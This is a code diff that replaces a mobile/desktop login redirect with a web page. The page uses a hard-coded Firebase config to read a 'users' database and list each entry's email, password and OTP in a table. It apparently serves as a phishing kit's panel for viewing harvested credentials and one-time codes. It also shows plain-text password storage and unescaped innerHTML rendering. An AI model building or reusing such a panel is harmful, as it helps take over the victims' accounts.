@@ -1,8 +1,50 @@
-<script type="text/javascript">
-if (screen.width <= 699) {
-    document.location = "mobile.html";
+<html>
+<head>
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+</head>
+<body>
+<div id="table-container"></div>
+</body>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
+<script src="https://www.gstatic.com/firebasejs/4.8.1/firebase.js"></script>
+<script>
+const firebaseConfig = {
+apiKey: "AIzaSyBIdCyVtyF604sJ3Iqh27jisoCKjhx69rE",
+authDomain: "sahayogi-147181.firebaseapp.com",
+projectId: "sahayogi-147181",
+databaseURL: "https://sahayogi-147181-default-rtdb.firebaseio.com/",
+storageBucket: "sahayogi-147181.appspot.com",
+messagingSenderId: "822985993451",
+appId: "1:822985993451:web:96e24dfa1c27d986a9e2ae",
+measurementId: "G-65K8VQGCZT"
+};
+
+firebase.initializeApp(firebaseConfig);
+const dbRef = firebase.database().ref();
+const usersRef = dbRef.child('users');
+
+function readPassword() {
+  usersRef.once("value")
+    .then(function(snapshot) {
+      var data = snapshot.val();
+      var tableHtml = "<table class='table table-striped'><thead><tr><th>Email</th><th>Password</th><th>OTP</th><th>PASSWORD</th></tr></thead><tbody>";
+
+      for (var key in data) {
+        tableHtml += "<tr>";
+        for(var usd in data[key]){
+        	tableHtml += "<td>"+data[key][usd]+"</td>";
+        }
+        tableHtml += "</tr>";
+      }
+
+      tableHtml += "</tbody></table>";
+
+      // Display the table in an HTML element with id "table-container"
+      document.getElementById("table-container").innerHTML = tableHtml;
+    })
+    .catch(function(error) {
+      console.error("Error reading data:", error);
+    });
 }
-else {
-    document.location = "login.html";
-}
-</script> 
+</script>
+</html>
